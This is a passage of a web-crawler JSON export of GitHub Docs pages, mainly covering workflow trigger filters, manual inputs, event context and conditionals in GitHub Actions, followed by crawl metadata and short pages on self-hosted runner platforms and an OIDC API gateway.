tags](#example-including-branches-and-tags)\n\nThe patterns defined in `branches` and `tags` are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a `push` event to:\n\n*   A branch named `main` (`refs/heads/main`)\n*   A branch named `mona/octocat` (`refs/heads/mona/octocat`)\n*   A branch whose name starts with `releases/`, like `releases/10` (`refs/heads/releases/10`)\n*   A tag named `v2` (`refs/tags/v2`)\n*   A tag whose name starts with `v1.`, like `v1.9.1` (`refs/tags/v1.9.1`)\n\n```\non:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches:\n      - main\n      - 'mona/octocat'\n      - 'releases/**'\n    # Sequence of patterns matched against refs/tags\n    tags:\n      - v2\n      - v1.*\n```\n\n#### [Example: Excluding branches and tags](#example-excluding-branches-and-tags)\n\nWhen a pattern matches the `branches-ignore` or `tags-ignore` pattern, the workflow will not run. The patterns defined in `branches` and `tags` are evaluated against the Git ref's name. For example, the following workflow would run whenever there is a `push` event, unless the `push` event is to:\n\n*   A branch named `mona/octocat` (`refs/heads/mona/octocat`)\n*   A branch whose name matches `releases/**-alpha`, like `releases/beta/3-alpha` (`refs/heads/releases/beta/3-alpha`)\n*   A tag named `v2` (`refs/tags/v2`)\n*   A tag whose name starts with `v1.`, like `v1.9` (`refs/tags/v1.9`)\n\n```\non:\n  push:\n    # Sequence of patterns matched against refs/heads\n    branches-ignore:\n      - 'mona/octocat'\n      - 'releases/**-alpha'\n    # Sequence of patterns matched against refs/tags\n    tags-ignore:\n      - v2\n      - v1.*\n```\n\n#### [Example: Including and excluding branches and tags](#example-including-and-excluding-branches-and-tags)\n\nYou can't use `branches` and `branches-ignore` to filter the same event in a single workflow. Similarly, you can't use `tags` and `tags-ignore` to filter the same event in a single workflow. If you want to both include and exclude branch or tag patterns for a single event, use the `branches` or `tags` filter along with the `!` character to indicate which branches or tags should be excluded.\n\nIf you define a branch with the `!` character, you must also define at least one branch without the `!` character. If you only want to exclude branches, use `branches-ignore` instead. Similarly, if you define a tag with the `!` character, you must also define at least one tag without the `!` character. If you only want to exclude tags, use `tags-ignore` instead.\n\nThe order that you define patterns matters.\n\n*   A matching negative pattern (prefixed with `!`) after a positive match will exclude the Git ref.\n*   A matching positive pattern after a negative match will include the Git ref again.\n\nThe following workflow will run on pushes to `releases/10` or `releases/beta/mona`, but not on `releases/10-alpha` or `releases/beta/3-alpha` because the negative pattern `!releases/**-alpha` follows the positive pattern.\n\n```\non:\n  push:\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'\n```\n\n### [Using filters to target specific paths for pull request or push events](#using-filters-to-target-specific-paths-for-pull-request-or-push-events)\n\nWhen using the `push` and `pull_request` events, you can configure a workflow to run based on what file paths are changed. Path filters are not evaluated for pushes of tags.\n\nUse the `paths` filter when you want to include file path patterns or when you want to both include and exclude file path patterns. Use the `paths-ignore` filter when you only want to exclude file path patterns. You cannot use both the `paths` and `paths-ignore` filters for the same event in a workflow. If you want to both include and exclude path patterns for a single event, use the `paths` filter prefixed with the `!` character to indicate which paths should be excluded.\n\nNote\n\nThe order that you define `paths` patterns matters:\n\n*   A matching negative pattern (prefixed with `!`) after a positive match will exclude the path.\n*   A matching positive pattern after a negative match will include the path again.\n\nIf you define both `branches`/`branches-ignore` and `paths`/`paths-ignore`, the workflow will only run when both filters are satisfied.\n\nThe `paths` and `paths-ignore` keywords accept glob patterns that use the `*` and `**` wildcard characters to match more than one path name. For more information, see the [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet).\n\n#### [Example: Including paths](#example-including-paths)\n\nIf at least one path matches a pattern in the `paths` filter, the workflow runs. For example, the following workflow would run anytime you push a JavaScript file (`.js`).\n\n```\non:\n  push:\n    paths:\n      - '**.js'\n```\n\nIf a workflow is skipped due to path filtering, [branch filtering](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#onpull_requestpull_request_targetbranchesbranches-ignore), or a [commit message](https://docs.github.com/en/actions/managing-workflow-runs/skipping-workflow-runs), then checks associated with that workflow will remain in a \"Pending\" state. A pull request that requires those checks to be successful will be blocked from merging.\n\n#### [Example: Excluding paths](#example-excluding-paths)\n\nWhen all the path names match patterns in `paths-ignore`, the workflow will not run. If any path names do not match patterns in `paths-ignore`, even if some path names match the patterns, the workflow will run.\n\nA workflow with the following path filter will only run on `push` events that include at least one file outside the `docs` directory at the root of the repository.\n\n```\non:\n  push:\n    paths-ignore:\n      - 'docs/**'\n```\n\n#### [Example: Including and excluding paths](#example-including-and-excluding-paths)\n\nYou cannot use `paths` and `paths-ignore` to filter the same event in a single workflow. If you want to both include and exclude path patterns for a single event, use the `paths` filter prefixed with the `!` character to indicate which paths should be excluded.\n\nIf you define a path with the `!` character, you must also define at least one path without the `!` character. If you only want to exclude paths, use `paths-ignore` instead.\n\nThe order that you define `paths` patterns matters:\n\n*   A matching negative pattern (prefixed with `!`) after a positive match will exclude the path.\n*   A matching positive pattern after a negative match will include the path again.\n\nThis example runs anytime the `push` event includes a file in the `sub-project` directory or its subdirectories, unless the file is in the `sub-project/docs` directory. For example, a push that changed `sub-project/index.js` or `sub-project/src/index.js` will trigger a workflow run, but a push changing only `sub-project/docs/readme.md` will not.\n\n```\non:\n  push:\n    paths:\n      - 'sub-project/**'\n      - '!sub-project/docs/**'\n```\n\n#### [Git diff comparisons](#git-diff-comparisons)\n\nNote\n\nIf you push more than 1,000 commits, or if GitHub does not generate the diff due to a timeout, the workflow will always run.\n\nThe filter determines if a workflow should run by evaluating the changed files and running them against the `paths-ignore` or `paths` list. If there are no files changed, the workflow will not run.\n\nGitHub generates the list of changed files using two-dot diffs for pushes and three-dot diffs for pull requests:\n\n*   **Pull requests:** Three-dot diffs are a comparison between the most recent version of the topic branch and the commit where the topic branch was last synced with the base branch.\n*   **Pushes to existing branches:** A two-dot diff compares the head and base SHAs directly with each other.\n*   **Pushes to new branches:** A two-dot diff against the parent of the ancestor of the deepest commit pushed.\n\nDiffs are limited to 300 files. If there are files changed that aren't matched in the first 300 files returned by the filter, the workflow will not run. You may need to create more specific filters so that the workflow will run automatically.\n\nFor more information, see [About comparing branches in pull requests](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests).\n\n### [Using filters to target specific branches for workflow run events](#using-filters-to-target-specific-branches-for-workflow-run-events)\n\nWhen using the `workflow_run` event, you can specify what branches the triggering workflow must run on in order to trigger your workflow.\n\nThe `branches` and `branches-ignore` filters accept glob patterns that use characters like `*`, `**`, `+`, `?`, `!` and others to match more than one branch name. If a name contains any of these characters and you want a literal match, you need to _escape_ each of these special characters with `\\`. For more information about glob patterns, see the [Workflow syntax for GitHub Actions](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions#filter-pattern-cheat-sheet).\n\nFor example, a workflow with the following trigger will only run when the workflow named `Build` runs on a branch whose name starts with `releases/`:\n\n```\non:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'\n```\n\nA workflow with the following trigger will only run when the workflow named `Build` runs on a branch that is not named `canary`:\n\n```\non:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches-ignore:\n      - \"canary\"\n```\n\nYou cannot use both the `branches` and `branches-ignore` filters for the same event in a workflow. If you want to both include and exclude branch patterns for a single event, use the `branches` filter along with the `!` character to indicate which branches should be excluded.\n\nThe order that you define patterns matters.\n\n*   A matching negative pattern (prefixed with `!`) after a positive match will exclude the branch.\n*   A matching positive pattern after a negative match will include the branch again.\n\nFor example, a workflow with the following trigger will run when the workflow named `Build` runs on a branch that is named `releases/10` or `releases/beta/mona` but will not `releases/10-alpha`, `releases/beta/3-alpha`, or `main`.\n\n```\non:\n  workflow_run:\n    workflows: [\"Build\"]\n    types: [requested]\n    branches:\n      - 'releases/**'\n      - '!releases/**-alpha'\n```\n\n## [Defining inputs for manually triggered workflows](#defining-inputs-for-manually-triggered-workflows)\n\nWhen using the `workflow_dispatch` event, you can optionally specify inputs that are passed to the workflow.\n\nThis trigger only receives events when the workflow file is on the default branch. The triggered workflow receives the inputs in the `inputs` context. For more information, see [Contexts](https://docs.github.com/en/actions/learn-github-actions/contexts#inputs-context).\n\nNote\n\n*   The workflow will also receive the inputs in the `github.event.inputs` context. The information in the `inputs` context and `github.event.inputs` context is identical except that the `inputs` context preserves Boolean values as Booleans instead of converting them to strings. The `choice` type resolves to a string and is a single selectable option.\n*   The maximum number of top-level properties for `inputs` is 10.\n*   The maximum payload for `inputs` is 65,535 characters.\n\n```\non:\n  workflow_dispatch:\n    inputs:\n      logLevel:\n        description: 'Log level'\n        required: true\n        default: 'warning'\n        type: choice\n        options:\n          - info\n          - warning\n          - debug\n      print_tags:\n        description: 'True to print to STDOUT'\n        required: true\n        type: boolean\n      tags:\n        description: 'Test scenario tags'\n        required: true\n        type: string\n      environment:\n        description: 'Environment to run tests against'\n        type: environment\n        required: true\n\njobs:\n  print-tag:\n    runs-on: ubuntu-latest\n    if: ${{ inputs.print_tags }} \n    steps:\n      - name: Print the input tag to STDOUT\n        run: echo  The tags are ${{ inputs.tags }} \n```\n\n## [Defining inputs, outputs, and secrets for reusable workflows](#defining-inputs-outputs-and-secrets-for-reusable-workflows)\n\nYou can define inputs and secrets that a reusable workflow should receive from a calling workflow. You can also specify outputs that a reusable workflow will make available to a calling workflow. For more information, see [Reusing workflows](https://docs.github.com/en/actions/using-workflows/reusing-workflows).\n\n## [Using event information](#using-event-information)\n\nInformation about the event that triggered a workflow run is available in the `github.event` context. The properties in the `github.event` context depend on the type of event that triggered the workflow. For example, a workflow triggered when an issue is labeled would have information about the issue and label.\n\n### [Viewing all properties of an event](#viewing-all-properties-of-an-event)\n\nReference the webhook event documentation for common properties and example payloads. For more information, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads).\n\nYou can also print the entire `github.event` context to see what properties are available for the event that triggered your workflow:\n\n```\njobs:\n  print_context:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          EVENT_CONTEXT: ${{ toJSON(github.event) }}\n        run: |\n          echo $EVENT_CONTEXT\n```\n\n### [Accessing and using event properties](#accessing-and-using-event-properties)\n\nYou can use the `github.event` context in your workflow. For example, the following workflow runs when a pull request that changes `package*.json`, `.github/CODEOWNERS`, or `.github/workflows/**` is opened. If the pull request author (`github.event.pull_request.user.login`) is not `octobot` or `dependabot[bot]`, then the workflow uses the GitHub CLI to label and comment on the pull request (`github.event.pull_request.number`).\n\n```\non:\n  pull_request:\n    types:\n      - opened\n    paths:\n      - '.github/workflows/**'\n      - '.github/CODEOWNERS'\n      - 'package*.json'\n\njobs:\n  triage:\n    if: >-\n      github.event.pull_request.user.login != 'octobot' &&\n      github.event.pull_request.user.login != 'dependabot[bot]'\n    runs-on: ubuntu-latest\n    steps:\n      - name: \"Comment about changes we can't accept\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          PR: ${{ github.event.pull_request.html_url }}\n        run: |\n          gh pr edit $PR --add-label 'invalid'\n          gh pr comment $PR --body 'It looks like you edited `package*.json`, `.github/CODEOWNERS`, or `.github/workflows/**`. We do not allow contributions to these files. Please review our [contributing guidelines](https://github.com/octo-org/octo-repo/blob/main/CONTRIBUTING.md) for what contributions are accepted.'\n```\n\nFor more information about contexts, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts). For more information about event payloads, see [Webhook events and payloads](https://docs.github.com/en/webhooks-and-events/webhooks/webhook-events-and-payloads).\n\n## [Further controlling how your workflow will run](#further-controlling-how-your-workflow-will-run)\n\nIf you want more granular control than events, event activity types, or event filters provide, you can use conditionals and environments to control whether individual jobs or steps in your workflow will run.\n\n### [Using conditionals](#using-conditionals)\n\nYou can use conditionals to further control whether jobs or steps in your workflow will run.\n\n#### [Example using a value in the event payload](#example-using-a-value-in-the-event-payload)\n\nFor example, if you want the workflow to run when a specific label is added to an issue, you can trigger on the `issues labeled` event activity type and use a conditional to check what label triggered the workflow. The following workflow will run when any label is added to an issue in the workflow's repository, but the `run_if_label_matches` job will only execute if the label is named `bug`.\n\n```\non:\n  issues:\n    types:\n      - labeled\n\njobs:\n  run_if_label_matches:\n    if: github.event.label.name == 'bug'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo 'The label was bug'\n```\n\n#### [Example using event type](#example-using-event-type)\n\nFor example, if you want to run different jobs or steps depending on what event triggered the workflow, you can use a conditional to check whether a specific event type exists in the event context. The following workflow will run whenever an issue or pull request is closed. If the workflow ran because an issue was closed, the `github.event` context will contain a value for `issue` but not for `pull_request`. Therefore, the `if_issue` step will run but the `if_pr` step will not run. Conversely, if the workflow ran because a pull request was closed, the `if_pr` step will run but the `if_issue` step will not run.\n\n```\non:\n  issues:\n    types:\n      - closed\n  pull_request:\n    types:\n      - closed\n\njobs:\n  state_event_type:\n    runs-on: ubuntu-latest\n    steps:\n    - name: if_issue\n      if: github.event.issue\n      run: |\n        echo An issue was closed\n    - name: if_pr\n      if: github.event.pull_request\n      run: |\n        echo A pull request was closed\n```\n\nFor more information about what information is available in the event context, see [Using event information](#using-event-information). For more information about how to use conditionals, see [Evaluate expressions in workflows and actions](https://docs.github.com/en/actions/learn-github-actions/expressions).\n\n### [Using environments to manually trigger workflow jobs](#using-environments-to-manually-trigger-workflow-jobs)\n\nIf you want to manually trigger a specific job in a workflow, you can use an environment that requires approval from a specific team or user. First, configure an environment with required reviewers. For more information, see [Managing environments for deployment](https://docs.github.com/en/actions/deployment/targeting-different-environments/managing-environments-for-deployment). Then, reference the environment name in a job in your workflow using the `environment:` key. Any job referencing the environment will not run until at least one reviewer approves the job.\n\nFor example, the following workflow will run whenever there is a push to main. The `build` job will always run. The `publish` job will only run after the `build` job successfully completes (due to `needs: [build]`) and after all of the rules (including required reviewers) for the environment called `production` pass (due to `environment: production`).\n\n```\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: build\n        run: |\n          echo 'building'\n\n  publish:\n    needs: [build]\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: publish\n        run: |\n          echo 'publishing'\n```\n\nNote\n\nEnvironments, environment secrets, and deployment protection rules are available in public repositories for all current GitHub plans. They are not available on legacy plans, such as Bronze, Silver, or Gold. For access to environments, environment secrets, and deployment branches in private or internal repositories, you must use GitHub Pro, GitHub Team, or GitHub Enterprise. If you are on a GitHub Free, GitHub Pro, or GitHub Team plan, other deployment protection rules, such as a wait timer or required reviewers, are only available for public repositories.\n\n## [Available events](#available-events)\n\nFor a full list of available events, see [Events that trigger workflows](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasMinWordsCrawleeHtmlToText",
    "totalLinks": 271,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-triggering-a-workflow-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-triggering-a-workflow-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-triggering-a-workflow-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-triggering-a-workflow-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-writing-workflows-choosing-when-your-workflow-runs-triggering-a-workflow-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 50968,
      "readableText": 46799,
      "none": 58494,
      "readableTextIfPossible": 46799,
      "result": 46799,
      "markdown": 34750
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/supported-architectures-and-operating-systems-for-self-hosted-runners",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/supported-architectures-and-operating-systems-for-self-hosted-runners",
    "loadedTime": "2025-05-08T06:42:27.030Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/supported-architectures-and-operating-systems-for-self-hosted-runners",
    "title": "Supported architectures and operating systems for self-hosted runners - GitHub Docs",
    "description": "The following processor architectures and operating systems are supported for the self-hosted runner application.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Supported architectures and operating systems for self-hosted runners - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/supported-architectures-and-operating-systems-for-self-hosted-runners"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/supported-architectures-and-operating-systems-for-self-hosted-runners"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "7011:20172B:BAAD1B:F51822:681C524D",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "date": "Thu, 08 May 2025 06:42:21 GMT",
      "via": "1.1 varnish",
      "age": "0",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686541.180311, VS0, VE204",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24248",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Supported architectures and operating systems for self-hosted runners\nThe following processor architectures and operating systems are supported for the self-hosted runner application.\nIn this article\nLinux\nRed Hat Enterprise Linux 8 or later\nCentOS 8 or later\nOracle Linux 8 or later\nFedora 29 or later\nDebian 10 or later\nUbuntu 20.04 or later\nLinux Mint 20 or later\nopenSUSE 15.2 or later\nSUSE Enterprise Linux (SLES) 15 SP2 or later\nWindows\nWindows 10 64-bit\nWindows 11 64-bit\nWindows Server 2016 64-bit\nWindows Server 2019 64-bit\nWindows Server 2022 64-bit\nmacOS\nmacOS 11.0 (Big Sur) or later\nSupported processor architectures\nx64 - Linux, macOS, Windows.\nARM64 - Linux, macOS, Windows (currently in public preview).\nARM32 - Linux.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-supported-architectures-and-operating-systems-for-self-hosted-dfydq.html",
  "markdown": "# Supported architectures and operating systems for self-hosted runners\n\nThe following processor architectures and operating systems are supported for the self-hosted runner application.\n\n## In this article\n\n## [Linux](#linux)\n\n*   Red Hat Enterprise Linux 8 or later\n*   CentOS 8 or later\n*   Oracle Linux 8 or later\n*   Fedora 29 or later\n*   Debian 10 or later\n*   Ubuntu 20.04 or later\n*   Linux Mint 20 or later\n*   openSUSE 15.2 or later\n*   SUSE Enterprise Linux (SLES) 15 SP2 or later\n\n## [Windows](#windows)\n\n*   Windows 10 64-bit\n*   Windows 11 64-bit\n*   Windows Server 2016 64-bit\n*   Windows Server 2019 64-bit\n*   Windows Server 2022 64-bit\n\n## [macOS](#macos)\n\n*   macOS 11.0 (Big Sur) or later\n\n## [Supported processor architectures](#supported-processor-architectures)\n\n*   `x64` - Linux, macOS, Windows.\n*   `ARM64` - Linux, macOS, Windows (currently in public preview).\n*   `ARM32` - Linux.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 235,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-supported-architectures-and-operating-systems-for-self-hosted",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-supported-architectures-and-operating-systems-for-self-hosted",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-supported-architectures-and-operating-systems-for-self-hosted",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-supported-architectures-and-operating-systems-for-self-hosted",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-supported-architectures-and-operating-systems-for-self-hosted"
    },
    "lengths": {
      "extractus": 1922,
      "readableText": 1611,
      "none": 22653,
      "readableTextIfPossible": 22653,
      "result": 1611,
      "markdown": 909
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/using-an-api-gateway-with-oidc",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/using-an-api-gateway-with-oidc",
    "loadedTime": "2025-05-08T06:42:26.844Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/using-an-api-gateway-with-oidc",
    "title": "Using an API gateway with OIDC - GitHub Docs",
    "description": "You can use OpenID Connect (OIDC) tokens to authenticate your workflow.",
    "author": null,
    "keywords": "Actions,Developer",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Using an API gateway with OIDC - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/using-an-api-gateway-with-oidc"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/using-github-hosted-runners/connecting-to-a-private-network/using-an-api-gateway-with-oidc"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "C02C:1ED828:4283A2:54A3B4:681C524C",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:42:21 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-nyc-kteb1890061-NYC",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686541.974701, VS0, VE337",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "24305",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Using an API gateway with OIDC\nYou can use OpenID Connect (OIDC) tokens to authenticate your workflow.\nUsing an API gateway with OIDC\nWith GitHub Actions, you can use OpenID Connect (OIDC) tokens to authenticate your workflow outside of GitHub Actions. For example, you could run an API gateway on the edge of your private network that authenticates incoming requests with the OIDC token and then makes API requests on behalf of your workflow in your private network.\nThe following diagram gives an overview of this solution's architecture:\nIt's important that you verify not just that the OIDC token came from GitHub Actions, but that it came specifically from your expected workflows, so that other GitHub Actions users aren't able to access services in your private network. You can use OIDC claims to create these conditions. For more information, see About security hardening with OpenID Connect.\nThe main disadvantages of this approach are that you must implement the API gateway to make requests on your behalf, and you must run the gateway on the edge of your network.\nThe following advantages apply.\nYou don't need to configure any firewalls, or modify the routing of your private network.\nThe API gateway is stateless and scales horizontally to handle high availability and high throughput.\nFor more information, see a reference implementation of an API Gateway in the github/actions-oidc-gateway repository. This implementation requires customization for your use case and is not ready-to-run as-is). For more information, see About security hardening with OpenID Connect.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-using-an-api-gateway-with-oidc-7gfidl.html",
  "markdown": "# Using an API gateway with OIDC\n\nYou can use OpenID Connect (OIDC) tokens to authenticate your workflow.\n\n## [Using an API gateway with OIDC](#using-an-api-gateway-with-oidc)\n\nWith GitHub Actions, you can use OpenID Connect (OIDC) tokens to authenticate your workflow outside of GitHub Actions. For example, you could run an API gateway on the edge of your private network that authenticates incoming requests with the OIDC token and then makes API requests on behalf of your workflow in your private network.\n\nThe following diagram gives an overview of this solution's architecture:\n\n![Diagram of an OIDC gateway architecture, starting with a GitHub Actions runner and ending with a private network's private service.](https://docs.github.com/assets/cb-22109/images/help/actions/actions-oidc-gateway.png)\n\nIt's important that you verify not just that the OIDC token came from GitHub Actions, but that it came specifically from your expected workflows, so that other GitHub Actions users aren't able to access services in your private network. You can use OIDC claims to create these conditions. For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#defining-trust-conditions-on-cloud-roles-using-oidc-claims).\n\nThe main disadvantages of this approach are that you must implement the API gateway to make requests on your behalf, and you must run the gateway on the edge of your network.\n\nThe following advantages apply.\n\n*   You don't need to configure any firewalls, or modify the routing of your private network.\n*   The API gateway is stateless and scales horizontally to handle high availability and high throughput.\n\nFor more information, see [a reference implementation of an API Gateway](https://github.com/github/actions-oidc-gateway-example) in the github/actions-oidc-gateway repository. This implementation requires customization for your use case and is not ready-to-run as-is). For more information, see [About security hardening with OpenID Connect](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect).",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 231,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-using-an-api-gateway-with-oidc-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-using-github-hosted-runners-connecting-to-a-private-network-using-an-api-gateway-with-oidc-removedElementsHtmlUrl",
